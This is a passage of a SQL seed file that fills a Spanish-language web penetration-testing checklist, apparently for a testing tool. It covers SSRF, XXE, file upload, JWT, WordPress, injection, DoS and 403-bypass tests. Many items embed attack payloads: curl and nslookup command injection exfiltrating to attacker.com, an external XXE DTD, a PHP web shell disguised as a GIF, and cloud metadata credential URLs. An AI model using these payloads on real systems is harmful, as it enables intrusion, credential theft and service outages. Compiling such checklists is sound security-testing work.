(15, 'Al probar SSO intentar buscar en Burp sobre URLs en encabezado Cookie', '## SSRF via Cookie\n\n- **Prueba:** A veces los sistemas de SSO guardan la URL de "retorno" o "estado" dentro de una cookie.\n- **Ataque:** Decodifica cookies y busca URLs internas.', 12);

-- ==========================================
-- CATEGORÍA: Pruebas de Inyección XML (ID 16)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(16, 'Cambiar el tipo de contenido a text/xml y probar XXE con /etc/passwd', '## Content-Type Spoofing\n\n- **Prueba:** Si el endpoint acepta JSON, cambia `Content-Type: application/json` a `text/xml`.\n- **Payload:** Envia XML válido. Si el parser XML está habilitado por defecto, podría procesarlo.', 1),

(16, 'Probar XXE con /etc/hosts', '## Lectura de Archivos Locales (LFI)\n\n- **Payload:**\n  ```xml\n  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]>\n  <root>&xxe;</root>\n  ```\n- **Objetivo:** Verificar mapeos de red interna.', 2),

(16, 'Probar XXE con /proc/self/cmdline', '## Reconocimiento de Sistema\n\n- **Payload:** `file:///proc/self/cmdline`\n- **Info:** Revela el comando que ejecutó el proceso (útil para saber si es Java, Python, banderas de inicio).', 3),

(16, 'Probar XXE con /proc/version', '## Versión del Kernel\n\n- **Payload:** `file:///proc/version`\n- **Uso:** Identificar el sistema operativo y versión del kernel para buscar exploits de escalada de privilegios locales.', 4),

(16, 'XXE ciego con interacción fuera de banda', '## XXE Ciego (OOB)\n\n- **Escenario:** El servidor procesa el XML pero no muestra el resultado en la respuesta.\n- **Payload:**\n  ```xml\n  <!DOCTYPE foo [\n  <!ENTITY % xxe SYSTEM "[http://attacker.com/evil.dtd](http://attacker.com/evil.dtd)">\n  %xxe;\n  ]>\n  ```\n- **Objetivo:** Forzar al servidor a conectar con tu máquina (SSRF) o exfiltrar datos vía DNS/HTTP.', 5);

-- ==========================================
-- CATEGORY: CORS (ID 17)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(17, 'Errores al analizar encabezados Origin', '## Reflejo de Origen (Origin Reflection)\n\n- **Prueba:** Envía `Origin: http://attacker.com`.\n- **Fallo:** Si la respuesta contiene `Access-Control-Allow-Origin: http://attacker.com` y `Access-Control-Allow-Credentials: true`.\n- **Impacto:** Permite robar datos de usuarios autenticados vía JS.', 1),

(17, 'Valor de origen null en lista blanca', '## Origen Null\n\n- **Prueba:** Envía `Origin: null`.\n- **Fallo:** Si responde con `Allow-Origin: null`, es explotable desde iframes sandboxeados (`<iframe sandbox="allow-scripts ...">`) que envían `null` como origen.', 2);

-- ==========================================
-- CATEGORY: SSRF (ID 18)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(18, 'Probar cargas básicas de localhost', '## Acceso Loopback\n\n- **Payloads:**\n  - `http://localhost`\n  - `http://127.0.0.1`\n  - `http://0.0.0.0`\n- **Objetivo:** Acceder a paneles de administración internos o métricas no expuestas.', 1),

(18, 'Eludir filtros: Eludir usando HTTPS', '## Protocolo Seguro\n\n- **Prueba:** `https://127.0.0.1` o `https://localhost`.\n- **Motivo:** A veces los filtros solo buscan "http://".', 2),

(18, 'Eludir filtros: Eludir con [::]', '## IPv6\n\n- **Payload:** `http://[::]:80/`\n- **Motivo:** Muchos filtros regex solo están diseñados para IPv4.', 3),

(18, 'Eludir filtros: Eludir con una redirección de dominio', '## Redirección DNS\n\n- **Servicio:** Usa `nip.io` o tu propio dominio.\n- **Payload:** `http://127.0.0.1.nip.io` -> Resuelve a 127.0.0.1.\n- **Técnica:** El filtro ve un dominio, pero el backend conecta a localhost.', 4),

(18, 'Eludir filtros: Eludir usando una ubicación IP decimal', '## Codificación Decimal/Octal\n\n- **Decimal:** `http://2130706433` (= 127.0.0.1)\n- **Octal:** `http://0177.0.0.1`\n- **Hex:** `http://0x7f000001`', 5),

(18, 'Eludir filtros: Eludir usando incrustación de direcciones IPv6/IPv4', '## Direcciones Híbridas\n\n- **Payload:** `http://[0:0:0:0:0:ffff:127.0.0.1]`\n- **Uso:** Evasión de filtros que no normalizan direcciones IP.', 6),

(18, 'Eludir filtros: Eludir usando URLs mal formadas', '## Rarezas de Parser\n\n- **Payloads:**\n  - `http://localhost#@google.com`\n  - `http://foo@localhost:80`\n  - `http://127.0.0.1:80\x00`', 7),

(18, 'Eludir filtros: Eludir usando dirección rara', '## DNS Alternativos\n\n- **Payload:** `http://localtest.me` (Resuelve a 127.0.0.1).', 8),

(18, 'Eludir filtros: Eludir usando alfanuméricos encerrados', '## Unicode Enclosed\n\n- **Payload:** `http://①②⑦.⓪.⓪.①`\n- **Teoría:** El navegador/backend puede normalizar estos caracteres Unicode a sus equivalentes numéricos ASCII.', 9),

(18, 'Instancias en la nube: Endpoints de metadatos de AWS', '## AWS SSRF\n\n- **Payload:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n- **Objetivo:** Robar claves de acceso AWS (AccessKey, SecretKey).', 10),

(18, 'Instancias en la nube: Endpoints de metadatos de Google Cloud', '## GCP SSRF\n\n- **Payload:** `http://metadata.google.internal/computeMetadata/v1/`\n- **Header Requerido:** `Metadata-Flavor: Google` (Bypass necesario en algunos casos).', 11),

(18, 'Instancias en la nube: Endpoints de metadatos de Digital Ocean', '## Digital Ocean SSRF\n\n- **Payload:** `http://169.254.169.254/metadata/v1.json`\n- **Información:** Revela datos del droplet y user data (que a veces contiene secretos).', 12),

(18, 'Instancias en la nube: Endpoints de metadatos de Azure', '## Azure SSRF\n\n- **Payload:** `http://169.254.169.254/metadata/instance?api-version=2021-02-01`\n- **Header Requerido:** `Metadata: true`.\n- **Objetivo:** Obtener tokens de identidad gestionada.', 13),

(18, 'Eludir mediante redirección abierta', '## Chain SSRF + Open Redirect\n\n- **Flujo:** El servidor objetivo valida el dominio inicial pero sigue redirecciones.\n- **Payload:** `http://good-domain.com/redirect?url=http://169.254.169.254`.\n- **Resultado:** El servidor confía en good-domain, este redirige a la IP metadata, y el servidor entrega el secreto.', 14);

-- ==========================================
-- CATEGORÍA: Pruebas de Carga de Archivos (ID 19)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(19, 'Cargar archivo malicioso en funcionalidad de carga de archivo', '## Zip Slip Vulnerability\n\n- **Concepto:** Subir un archivo comprimido (`.zip`, `.tar`) que contiene nombres de archivo con path traversal (`../../shell.php`).\n- **Impacto:** Al descomprimirse en el servidor, el archivo malicioso se escribe fuera del directorio de subidas, sobrescribiendo archivos críticos o alojando una shell.', 1),

(19, 'Cargar un archivo y cambiar su ruta para sobrescribir un archivo del sistema existente', '## Path Traversal en Filename\n\n- **Prueba:** Intercepta la subida. Cambia `filename="foto.jpg"` a `filename="../../etc/passwd"` o `filename="../../index.php"`.\n- **Objetivo:** Sobrescribir archivos de configuración o reemplazar el index del sitio.', 2),

(19, 'Denegación de servicio por archivo grande', '## Agotamiento de Disco\n\n- **Prueba:** Intenta subir un archivo de 10GB (o usa un archivo "sparse" que ocupa poco en tu disco pero mucho en el servidor).\n- **Resultado:** Si el servidor no valida el `Content-Length` o corta la conexión, puedes llenar el disco duro y tumbar el servicio.', 3),

(19, 'Fuga de metadatos', '## Fuga de Datos Exif\n\n- **Análisis:** Descarga las imágenes subidas por otros usuarios.\n- **Herramienta:** `exiftool image.jpg`.\n- **Riesgo:** Coordenadas GPS exactas, modelo de cámara, software de edición, nombres de usuario del sistema operativo.', 4),

(19, 'Ataques de biblioteca ImageMagick', '## ImageTragick (CVE-2016-3714)\n\n- **Concepto:** Vulnerabilidad en librerías de procesamiento de imágenes.\n- **Payload:** Archivos `.mvg` o `.svg` maliciosos que ejecutan comandos del sistema al ser procesados.\n- **Prueba:** Inyectar comandos dentro de los metadatos de la imagen.', 5),

(19, 'Ataque de inundación de píxeles', '## Bomba de Descompresión (RAM DoS)\n\n- **Técnica:** Crear una imagen de 100x100 píxeles, pero cambiar sus metadatos para que diga que es de 50.000x50.000.\n- **Impacto:** Cuando el servidor intenta cargarla en memoria RAM para procesarla, consume toda la memoria disponible y crashea.', 6),

(19, 'Eludir: Eludir byte nulo (%00)', '## Truncamiento de Extensiones\n\n- **Payload:** `shell.php%00.jpg` o `shell.php\x00.jpg`.\n- **Teoría:** El validador lee ".jpg" (válido), pero el sistema de archivos (escrito en C) corta el nombre en el byte nulo, guardando `shell.php`.', 7),

(19, 'Eludir: Eludir Content-Type', '## Spoofing de Tipo MIME\n\n- **Prueba:** Sube `shell.php`.\n- **Intercepta:** Cambia el header `Content-Type: application/x-php` a `Content-Type: image/jpeg`.\n- **Fallo:** El servidor confía en el header declarado por el usuario en lugar de verificar el contenido real.', 8),

(19, 'Eludir: Eludir Magic Byte', '## Falsificación de Cabecera de Archivo\n\n- **Técnica:** Agrega los "Magic Bytes" de una imagen al inicio de tu script PHP.\n- **Payload:** `GIF89a; <?php system($_GET[''cmd'']); ?>`.\n- **Resultado:** El servidor cree que es un GIF válido, pero el intérprete PHP ejecuta el código.', 9),

(19, 'Eludir: Eludir validación del lado del cliente', '## Validación en JavaScript\n\n- **Detección:** Si el error salta instantáneamente sin petición de red.\n- **Bypass:** Desactiva JS en el navegador o usa Burp Suite para subir el archivo, ya que Burp se salta el navegador.', 10),

(19, 'Eludir: Eludir extensiones de lista negra', '## Extensiones Alternativas\n\n- **Lista Negra:** Si bloquean `.php`, prueba:\n  - `.php3`, `.php4`, `.php5`, `.phtml`, `.phar`, `.inc`.\n  - `.jsp`, `.jspx`, `.jsw`, `.jsv`.\n  - `.asp`, `.aspx`, `.cer`, `.asa`.\n- **Configuración:** A veces Apache/Nginx ejecutan estas extensiones como scripts.', 11),

(19, 'Eludir: Eludir caracteres homográficos', '## Unicode Confusion\n\n- **Técnica:** Usar caracteres cirílicos que parecen letras latinas en el nombre de la extensión (`p` cirílica vs `p` latina).\n- **Objetivo:** Confundir al filtro de validación.', 12);

-- ==========================================
-- CATEGORÍA: Pruebas de CAPTCHA (ID 20)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(20, 'Falta de verificaciones de integridad del campo Captcha', '## Eliminación de Parámetro\n\n- **Prueba:** Intercepta la petición y borra el parámetro `g-recaptcha-response` o `captcha_code`.\n- **Fallo:** El backend puede estar configurado para validar el captcha *solo si el parámetro existe*.', 1),

(20, 'Manipulación de verbo HTTP', '## Cambio de Método\n\n- **Prueba:** Cambia `POST /register` a `GET /register` enviando los parámetros en la URL.\n- **Fallo:** A veces el control de Captcha solo está aplicado en la ruta POST.', 2),

(20, 'Conversión de tipo de contenido', '## JSON vs Form-Data\n\n- **Prueba:** Cambia el `Content-Type` de `application/x-www-form-urlencoded` a `application/json` (o viceversa).\n- **Fallo:** El parser del backend podría saltarse la validación del captcha en formatos inesperados.', 3),

(20, 'Captcha reutilizable', '## Ataque de Replay\n\n- **Prueba:** Resuelve un captcha válido. Envía la petición. Intercepta y envíala de nuevo con EL MISMO código de captcha.\n- **Regla:** El captcha debe "quemarse" (invalidarse) tras el primer uso.', 4),

(20, 'Verificar si el captcha es recuperable con la ruta absoluta', '## Fuga de Fuente\n\n- **Prueba:** Inspecciona el código fuente HTML. A veces el valor del captcha está en un input hidden, en una cookie o en un comentario JS (`var captcha = "1234"`).', 5),

(20, 'Verificar validación del lado del servidor para CAPTCHA', '## Validación Fake\n\n- **Prueba:** Escribe cualquier valor aleatorio (`0000`).\n- **Fallo:** Si el captcha es solo cosmético (validado solo por JS en el cliente) y el servidor lo acepta.', 6),

(20, 'Verificar si el reconocimiento de imagen se puede hacer con herramienta OCR', '## Debilidad de Complejidad\n\n\n\n- **Herramientas:** `Tesseract`, extensiones de navegador de resolución automática.\n- **Fallo:** Si un bot puede leer el texto fácilmente, el captcha es inútil.', 7);

-- ==========================================
-- CATEGORÍA: Pruebas de Token JWT (ID 21)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(21, 'Fuerza bruta de claves secretas', '## Crackeo de Firma HMAC\n\n- **Herramienta:** `hashcat` o `jwt_tool`.\n- **Comando:** `hashcat -m 16500 token.txt wordlist.txt`.\n- **Objetivo:** Encontrar la clave secreta usada para firmar. Si la tienes, puedes forjar tokens de admin.', 1),

(21, 'Firmar un nuevo token con el algoritmo "none"', '## Algoritmo None\n\n\n\n- **Payload:** Cambia el header a `{"alg": "none", "typ": "JWT"}`. Elimina la firma (la última parte tras el segundo punto).\n- **Fallo:** Algunas librerías aceptan tokens sin firma si el algoritmo es "none".', 2),

(21, 'Cambiar el algoritmo de firma del token', '## Downgrade Attack\n\n- **Prueba:** Si el servidor usa `RS256` (Asimétrico), cambia el header a `HS256` (Simétrico) y firma el token usando la Clave Pública del servidor como "secreto".', 3),

(21, 'Firmar el token firmado asimétricamente con su algoritmo simétrico coincidente', '## Key Confusion Attack (CVE-2016-10555)\n\n- **Concepto:** Forzar al servidor a usar su propia clave pública (que es pública) como clave secreta HMAC para validar el token.', 4);

-- ==========================================
-- CATEGORÍA: Pruebas de Websockets (ID 22)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(22, 'Interceptar y modificar mensajes de WebSocket', '## Manipulación en Tiempo Real\n\n- **Herramienta:** Burp Suite -> Proxy -> WebSockets history.\n- **Acción:** Intercepta mensajes `Client-to-Server`. Modifica parámetros JSON en vuelo (e.g., inyección SQL en mensajes de chat).', 1),

(22, 'Intentos MITM de Websockets', '## Cross-Site WebSocket Hijacking (CSWSH)\n\n- **Prueba:** Verifica si el servidor valida el header `Origin` durante el handshake (Upgrade request).\n- **Ataque:** Si no valida Origin, un atacante puede iniciar una conexión websocket desde su sitio malicioso usando las cookies de la víctima.', 2),

(22, 'Probar encabezado secreto de websocket', '## Handshake Seguro\n\n- **Verificación:** ¿Las credenciales viajan en la URL (`ws://site.com?token=xyz`)? Eso es inseguro (logs, historial).\n- **Correcto:** Deben ir en Cookies o Headers de autorización durante el Upgrade HTTP.', 3),

(22, 'Robo de contenido en websockets', '## Exfiltración CSWSH\n\n- **Escenario:** Si existe CSWSH, el atacante conecta un socket y "escucha" los mensajes privados que recibe la víctima.', 4),

(22, 'Prueba de autenticación de token en websockets', '## Caducidad de Sesión\n\n- **Prueba:** Una vez establecido el socket, haz logout en la app web. Envía un mensaje por el socket.\n- **Fallo:** Los websockets a menudo se olvidan de validar que la sesión sigue activa tras la conexión inicial.', 5);

-- ==========================================
-- CATEGORÍA: Pruebas de Vulnerabilidades de GraphQL (ID 23)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(23, 'Verificaciones de autorización inconsistentes', '## IDOR en Graph\n\n- **Prueba:** En una query como `query { user(id: 123) { email } }`, cambia el ID.\n- **Nota:** GraphQL a menudo expone el grafo completo, y los devs olvidan proteger nodos específicos.', 1),

(23, 'Falta de validación de escalares personalizados', '## Inyección en Scalars\n\n- **Prueba:** Inyecta SQLi o XSS dentro de las variables de la query GraphQL (`$variable`).\n- **Fallo:** Los tipos personalizados (e.g., `Email`, `Date`) pueden no estar saneados correctamente.', 2),

(23, 'Fallo al limitar adecuadamente la velocidad', '## DoS por Complejidad (Nested Queries)\n\n- **Payload:**\n  ```graphql\n  query { author { posts { author { posts { ... } } } } }\n  ```\n- **Impacto:** Consultas cíclicas profundas que agotan la CPU del servidor.', 3),

(23, 'Consulta de introspección habilitada/deshabilitada', '## Reconocimiento Total\n\n- **Query:** `query { __schema { types { name fields { name } } } }`.\n- **Riesgo:** Si está habilitado, te entrega la documentación completa de la API, incluyendo queries ocultas o de administración.', 4);

-- ==========================================
-- CATEGORÍA: Vulnerabilidades Comunes de WordPress (ID 24)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(24, 'XSPA en wordpress', '## XML-RPC Pingback\n\n- **Endpoint:** `/xmlrpc.php`.\n- **Ataque:** Usar la función `pingback.ping` para escanear puertos internos (SSRF) o lanzar ataques DDoS a terceros.', 1),

(24, 'Fuerza bruta en wp-login.php', '## Falta de Rate Limiting\n\n- **Prueba:** `Hydra` o `Wpscan` contra el login.\n- **Defensa:** Plugins como Wordfence o fail2ban.', 2),

(24, 'Divulgación de información de nombre de usuario de wordpress', '## Enumeración de Usuarios\n\n- **Técnicas:**\n  - `/?author=1`, `/?author=2` (Redirige al slug del usuario).\n  - `/wp-json/wp/v2/users` (API REST expuesta).\n- **Impacto:** Facilita ataques de fuerza bruta.', 3),

(24, 'Archivo de respaldo wp-config expuesto', '## Archivos de Configuración\n\n- **Busca:** `wp-config.php.bak`, `wp-config.php.old`, `.wp-config.php.swp`.\n- **Contenido:** Credenciales de la base de datos en texto plano.', 4),

(24, 'Archivos de registro expuestos', '## Logs de Debug\n\n- **Ruta:** `/wp-content/debug.log`.\n- **Riesgo:** Si `WP_DEBUG_LOG` está activo, puede contener errores PHP que revelan rutas, usuarios o tokens.', 5),

(24, 'Denegación de servicio a través de load-styles.php', '## Concatenación de Scripts\n\n- **Payload:** `/wp-admin/load-styles.php?c=1&load[]=dashicons&load[]=admin-bar&...` (Repetir cientos de veces).\n- **Efecto:** Obliga al servidor a concatenar miles de archivos en una sola respuesta, agotando recursos.', 6),

(24, 'Denegación de servicio a través de load-scripts.php', '## DoS similar a Styles\n\n- **Vector:** Mismo ataque que el anterior pero en `/wp-admin/load-scripts.php`. A veces requiere estar autenticado (incluso con bajos privilegios).', 7),

(24, 'DDOS usando xmlrpc.php', '## Amplificación XML-RPC\n\n- **Payload:** `system.multicall`. Permite ejecutar miles de métodos en una sola petición HTTP.', 8),

(24, 'CVE-2018-6389', '## DoS en JS/CSS\n\n- **Ref:** Vulnerabilidad específica de concatenación de scripts en versiones antiguas de WP.', 9),

(24, 'CVE-2021-24364', '## Vulnerabilidades en Plugins\n\n- **Acción:** Usar `wpscan --enumerate p` para detectar plugins vulnerables conocidos.', 10),

(24, 'WP-Cronjob DOS', '## Cron Externo\n\n- **Archivo:** `/wp-cron.php`.\n- **Ataque:** Peticiones masivas a este archivo pueden saturar el servidor si se ejecutan tareas pesadas en cada visita.', 11);

-- ==========================================
-- CATEGORY: XPath Injection (ID 25)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(25, 'Inyección XPath para eludir autenticación', '## Bypass de Login XML\n\n- **Payload:** `'' or ''1''=''1` o `admin''] | * | user[@name=''admin`.\n- **Contexto:** Aplicaciones que usan bases de datos XML para guardar usuarios.', 1),

(25, 'Inyección XPath para exfiltrar datos', '## Extracción de Datos\n\n- **Versiones:** XPath 1.0 vs 2.0.\n- **Técnica:** Similar a SQL Injection UNION. Manipular la query para que devuelva nodos hijos del documento XML.', 2),

(25, 'Inyecciones XPath ciegas y basadas en tiempo', '## Inyección Ciega\n\n- **Payload:** `substring(//user[1]/password, 1, 1)=''a''`.\n- **Método:** Adivinar la contraseña carácter por carácter basándose en si la respuesta es verdadera (contenido) o falsa (vacío).', 3);

-- ==========================================
-- CATEGORY: LDAP Injection (ID 26)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(26, 'Inyección LDAP para eludir autenticación', '## Bypass de Login LDAP\n\n- **Payload:** `*` (Asterisco es comodín en LDAP).\n- **Ejemplo:** User: `admin*`, Pass: `cualquiera`.\n- **Query Result:** `(&(user=admin*)(pass=...))` -> Encuentra al admin ignorando el resto.', 1),

(26, 'Inyección LDAP para exfiltrar datos', '## Inyección de Filtros\n\n- **Payload:** `*)(uid=*))\x00`.\n- **Objetivo:** Manipular los filtros AND/OR (`&`, `|`) para extraer atributos ocultos como teléfonos o emails de otros usuarios.', 2);

-- ==========================================
-- CATEGORY: Denial of Service (ID 27)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(27, 'Bomba de cookies', '## DoS de Cliente\n\n- **Técnica:** Establecer muchas cookies grandes via XSS o script.\n- **Efecto:** El navegador envía cabeceras HTTP gigantes. El servidor rechaza la petición (`431 Request Header Fields Too Large`). El usuario no puede acceder al sitio hasta limpiar cookies.', 1),

(27, 'Inundación de píxeles, usando imagen con píxeles enormes', '## (Duplicado de File Upload)\n\nImagen con dimensiones declaradas masivas (50k x 50k) para agotar RAM del servidor.', 2),

(27, 'Inundación de marcos, usando GIF con marco enorme', '## GIF de la Muerte\n\n- **Payload:** GIF animado con miles de frames.\n- **Impacto:** Agotamiento de CPU al procesar la animación.', 3),

(27, 'ReDoS (DoS de Regex)', '## Expresiones Regulares Maliciosas\n\n- **Payload:** `aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!`.\n- **Vulnerabilidad:** Regex "catastróficos" (e.g., `(a+)+`) que tardan tiempo exponencial en procesar cadenas largas que no coinciden.', 4),

(27, 'CPDoS (Denegación de servicio por envenenamiento de caché)', '## Envenenamiento de Caché\n\n- **Técnica:** Forzar al servidor a generar una respuesta de error (400 Bad Request) que se almacene en la caché (CDN/Varnish).\n- **Impacto:** Todos los usuarios legítimos reciben el error cacheado.', 5);

-- ==========================================
-- CATEGORY: 403 Bypass (ID 28)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(28, 'Usar encabezado "X-Original-URL"', '## Override Headers\n\n- **Prueba:** Enviar petición a `/` (permitido) pero añadir `X-Original-URL: /admin`.\n- **Headers:** También probar `X-Rewrite-URL`, `X-Forwarded-For`.\n- **Frameworks:** Común en Symfony y ASP.NET.', 1),

(28, 'Agregar %2e después de la primera barra', '## URL Encoding Tricky\n\n- **Payload:** `/admin` -> `/%2e/admin`.\n- **Teoría:** El WAF no reconoce la ruta, pero el backend normaliza `%2e` a `.` y resuelve la ruta correctamente.', 2),

(28, 'Intentar agregar punto (.) barra (/) y punto y coma (;) en la URL', '## Confusión de Rutas\n\n- **Payloads:**\n  - `/admin/.`\n  - `/admin/;`\n  - `/admin/`\n  - `//admin//`\n- **Objetivo:** Engañar reglas de coincidencia exacta (Exact Match).', 3),

(28, 'Agregar "..;/" después del nombre del directorio', '## Estilo Tomcat/Java\n\n- **Payload:** `/admin/..;/`\n- **Variante:** `/sensitive/..;/sensitive`.\n- **Efecto:** El servidor de aplicaciones interpreta el `;` como separador de parámetros y sube un directorio, accediendo al recurso.', 4),

(28, 'Intentar poner el alfabeto en mayúsculas en la URL', '## Case Sensitivity\n\n- **Payload:** `/ADMIN` o `/AdMiN`.\n- **Fallo:** Si el WAF bloquea `/admin` (minúsculas) pero el servidor de archivos (Windows/IIS) es case-insensitive.', 5),

(28, 'Herramienta-bypass-403', '## Automatización\n\n- **Herramientas:** Scripts como `403bypasser.sh` o `bypass-403` prueban automáticamente todas estas combinaciones.', 6),

(28, 'Extensión de Burp-403 Bypasser', '## Extensión de Burp\n\n- **Uso:** Instala la extensión "403 Bypasser" en Burp Suite para probar payloads de evasión automáticamente en cada petición 403 detectada.', 7);

-- ==========================================
-- CATEGORY: Other Test Cases (ID 29)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
(29, 'Probar autorización de rol', '## Escalada de Privilegios Vertical\n\n- **Objetivo:** Acceder a funciones de Admin siendo Usuario.\n- **Prueba:** Captura una petición de Admin (e.g., `/admin/deleteUser`). Repítela usando la cookie de sesión de un usuario normal.\n- **Herramienta:** `Burp Authorize` (Extensión) automatiza esto.', 1),

(29, 'Verificar si el usuario normal puede acceder a recursos de usuarios con privilegios altos', '## Broken Object Level Authorization (BOLA/IDOR)\n\n- **Prueba:** Intentar acceder a objetos (facturas, mensajes) que pertenecen a roles superiores manipulando IDs en la URL o API.', 2),

(29, 'Navegación forzada', '## Descubrimiento de Contenido Oculto\n\n- **Técnica:** Fuzzing de directorios y archivos no enlazados.\n- **Wordlists:** `Common.txt`, `raft-large-directories.txt`.\n- **Herramientas:** `Feroxbuster`, `Dirsearch`, `Gobuster`.\n- **Objetivo:** Encontrar `/backup`, `/config`, `/test`, `.git`.', 3),

(29, 'Referencia directa a objeto inseguro', '## (Referencia Cruzada)\n\nVerifica si puedes acceder a datos de otros usuarios modificando IDs secuenciales (`user_id=100` -> `101`).', 4),

(29, 'Alteración de parámetros para cambiar cuenta de usuario', '## Manipulación de Parámetros\n\n- **Prueba:** Busca parámetros ocultos en formularios POST (`<input type="hidden" name="role" value="user">`).\n- **Ataque:** Cambia `user` a `admin` o `root` antes de enviar.', 5),

(29, 'Verificar encabezados de seguridad: X Frame Options', '## Prevención de Clickjacking\n\n- **Valor Esperado:** `DENY` o `SAMEORIGIN`.\n- **Riesgo:** Si falta, un atacante puede cargar tu sitio en un `iframe` transparente y engañar a los usuarios para que hagan clic en botones ocultos.', 6),

(29, 'Verificar encabezados de seguridad: Encabezado X-XSS', '## Filtro XSS Legacy\n\n- **Valor:** `1; mode=block`.\n- **Nota:** Obsoleto en navegadores modernos (que usan CSP), pero útil para defensa en profundidad en navegadores viejos.', 7),

(29, 'Verificar encabezados de seguridad: Encabezado HSTS', '## Strict-Transport-Security\n\n- **Función:** Fuerza al navegador a usar siempre HTTPS, evitando ataques de `SSL Stripping`.\n- **Verificación:** Debe tener `max-age` largo (e.g., 1 año) y `includeSubDomains`.', 8),

(29, 'Verificar encabezados de seguridad: Encabezado CSP', '## Content Security Policy\n\n\n\n- **Crítico:** Define qué scripts pueden ejecutarse.\n- **Bypass:** Busca `unsafe-inline`, `unsafe-eval` o wildcards (`*`) que debilitan la política y permiten XSS.', 9),

(29, 'Verificar encabezados de seguridad: Política de Referrer', '## Privacidad de Referer\n\n- **Riesgo:** Si es laxo, las URLs con tokens sensibles (`site.com/reset?token=xyz`) se filtran a terceros en el header `Referer`.\n- **Recomendado:** `strict-origin-when-cross-origin` o `no-referrer`.', 10),

(29, 'Verificar encabezados de seguridad: Cache Control', '## Datos Sensibles en Caché\n\n- **Prueba:** Verifica respuestas con datos privados (perfil, banco).\n- **Requerido:** `Cache-Control: no-store, no-cache`. Si no, los datos quedan en el disco del usuario o proxies intermedios.', 11),

(29, 'Verificar encabezados de seguridad: Public key pins', '## HPKP (Deprecado)\n\n- **Nota:** Public Key Pinning ha sido eliminado de la mayoría de navegadores modernos por riesgo de "Brickear" el dominio. Se prefiere usar registros CAA en DNS.', 12),

(29, 'Inyección ciega de comandos del SO: usando retardos de tiempo', '## Inyección Ciega (Time-Based)\n\n\n\n- **Payloads:**\n  - `|| sleep 10`\n  - `; sleep 10;`\n  - `& ping -c 10 127.0.0.1 &`\n- **Indicador:** Si la respuesta tarda 10 segundos más de lo normal, hay ejecución de código.', 13),

(29, 'Inyección ciega de comandos del SO: redirigiendo la salida', '## Escritura en Webroot\n\n- **Payload:** `|| whoami > /var/www/html/out.txt ||`\n- **Verificación:** Navega a `http://target.com/out.txt` para ver el resultado del comando.', 14),

(29, 'Inyección ciega de comandos del SO: con interacción fuera de banda', '## Interacción OOB\n\n- **Payload:** `|| curl http://attacker.com ||` o `|| nslookup attacker.com ||`.\n- **Herramienta:** Burp Collaborator. Si recibes una petición DNS/HTTP, es vulnerable.', 15),

(29, 'Inyección ciega de comandos del SO: con exfiltración de datos fuera de banda', '## Exfiltración de Datos\n\n- **Payload:** `|| curl http://attacker.com/$(whoami) ||`\n- **Resultado:** Recibirás una petición en tu servidor como `GET /root`, revelando el usuario del sistema.', 16),

(29, 'Inyección de comandos en exportación CSV (Carga/Descarga)', '## CSV Injection (Formula Injection)\n\n\n\n- **Payload:** Si el input del usuario (`=cmd|'' /C calc''!A0`) se refleja en un CSV descargado por un administrador.\n- **Impacto:** Al abrir el archivo en Excel, se ejecuta la calculadora (o malware).', 17),

(29, 'Inyección de macro de Excel CSV', '## Variantes de Fórmulas\n\n- **Caracteres de inicio:** `=`, `+`, `-`, `@`.\n- **Prueba:** `+2+3` (Si Excel muestra 5, es vulnerable).\n- **Riesgo:** Ejecución de código arbitrario en la máquina de la víctima (Client-Side attack).', 18),

(29, 'Si encuentras el archivo phpinfo.php, verificar fuga de configuración', '## Information Disclosure\n\n- **Buscar:**\n  - `DOCUMENT_ROOT` (Ruta física).\n  - `Environment Variables` (AWS Keys, DB Passwords).\n  - Versiones de librerías vulnerables.', 19),

(29, 'Contaminación de parámetros en botones de compartir de redes sociales', '## Hijacking de Redes Sociales\n\n- **Prueba:** Manipular parámetros en botones de "Compartir".\n- **Impacto:** Modificar la URL que se comparte para que apunte a un sitio malicioso en lugar del artículo original.', 20),

(29, 'Criptografía rota: Fallo de implementación de criptografía', '## Fallos de Implementación\n\n- **Ejemplos:** Padding Oracle Attack (mensajes de error de descifrado), uso de claves estáticas, o reutilización de Nonce/IV.', 21),

(29, 'Criptografía rota: Información cifrada comprometida', '## Claves Hardcodeadas\n\n- **Análisis:** Revisa el código JS o descompila la APK móvil.\n- **Hallazgo:** Claves privadas RSA o claves API almacenadas en texto plano dentro del código fuente.', 22),

(29, 'Criptografía rota: Cifrados débiles usados para cifrado', '## Algoritmos Obsoletos\n\n- **Checks:** Uso de `DES`, `RC4`, `MD5` (para firmas) o `HTTP` simple para login.\n- **Herramienta:** `testssl.sh` o `sslyze` para analizar la configuración SSL/TLS.', 23),

(29, 'Pruebas de servicios web: Probar para recorrido de directorios', '## Path Traversal en API\n\n- **Endpoint:** `/api/download?file=...`\n- **Payload:** `../../../../etc/passwd`.\n- **Nota:** A veces las APIs XML/SOAP son vulnerables a esto en los parámetros de la entidad.', 24),

(29, 'Pruebas de servicios web: Divulgación de documentación de servicios web', '## Reconocimiento de API\n\n- **Archivos:** `wsdl`, `swagger.json`, `/api-docs`.\n- **Riesgo:** Expone todos los endpoints, parámetros y tipos de datos, facilitando el ataque a funciones ocultas.', 25);

-- ==========================================
-- CATEGORY: Burp Suite Extensions (ID 30)
-- ==========================================

INSERT INTO checklist_items (category_id, title, description, order_num) VALUES
